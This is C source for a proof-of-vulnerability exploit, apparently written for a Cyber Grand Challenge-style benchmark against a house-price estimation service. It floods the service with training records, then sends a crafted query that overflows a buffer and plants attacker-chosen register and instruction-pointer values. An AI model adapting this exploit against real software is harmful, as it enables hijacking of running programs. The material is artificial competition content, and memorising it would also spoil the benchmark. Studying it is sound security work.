#include <libpov.h>

int main(void)
{
  unsigned int i;
  unsigned char payload[5000], output[4096];
  size_t pay_len = 0;
  unsigned short num_beds, num_baths, sq_ft, num_crimes;
  type1_vals t1;
  type1_negotiate(0xffffffff, 0xffffffff, 5, &t1);

  /* Train */
  random(&num_beds, sizeof(unsigned short), NULL);
  random(&num_baths, sizeof(unsigned short), NULL);
  random(&sq_ft, sizeof(unsigned short), NULL);
  random(&num_crimes, sizeof(unsigned short), NULL);
  num_beds %= 20;
  num_beds = num_beds ? num_beds : num_beds + 1;
  num_baths %= 25;
  num_baths = num_baths ? num_baths : num_baths + 1;
  sq_ft %= 20000;
  sq_ft = sq_ft ? sq_ft : sq_ft + 1;
  num_crimes %= 500;
  num_crimes = num_crimes ? num_crimes : num_crimes + 1;
  for (i = 0; i < 500; ++i)
  {
    *(unsigned short *)&payload[pay_len] = num_beds; pay_len += sizeof(unsigned short);
    *(unsigned short *)&payload[pay_len] = num_baths; pay_len += sizeof(unsigned short);
    *(unsigned short *)&payload[pay_len] = sq_ft; pay_len += sizeof(unsigned short);
    *(unsigned short *)&payload[pay_len] = num_crimes; pay_len += sizeof(unsigned short);
    *(unsigned short *)&payload[pay_len] = 1337; pay_len += sizeof(unsigned short);
  }
  i = 1000;
  transmit_all(STDOUT, &i, sizeof(unsigned int));
  transmit_all(STDERR, &i, sizeof(unsigned int));
  for (i = 0; i < 2; ++i)
  {
    transmit_all(STDOUT, payload, pay_len);
    transmit_all(STDERR, payload, pay_len);
  }

  /* Query */
  transmit_all(STDOUT, "\x00\x00\x00\x03", 4);
  transmit_all(STDERR, "\x00\x00\x00\x03", 4);
  pay_len = 0;
  *(unsigned short *)&payload[pay_len] = num_beds; pay_len += sizeof(unsigned short);
  *(unsigned short *)&payload[pay_len] = num_baths; pay_len += sizeof(unsigned short);
  *(unsigned short *)&payload[pay_len] = sq_ft; pay_len += sizeof(unsigned short);
  *(unsigned short *)&payload[pay_len] = num_crimes; pay_len += sizeof(unsigned short);
  *(unsigned int *)&payload[pay_len] = 32; pay_len += sizeof(unsigned int);
  random(&payload[pay_len], 24, NULL);
  pay_len += 24;
  *(unsigned int *)&payload[pay_len] = t1.regval; pay_len += sizeof(unsigned int);
  *(unsigned int *)&payload[pay_len] = t1.ipval; pay_len += sizeof(unsigned int);
  transmit_all(STDOUT, payload, pay_len);
  transmit_all(STDERR, payload, pay_len);

  /* Quit */
  transmit_all(STDOUT, "\x00\x00\x00\x04", 4);
  transmit_all(STDERR, "\x00\x00\x00\x04", 4);
  length_read(STDIN, output, 28);

  return 0;
}
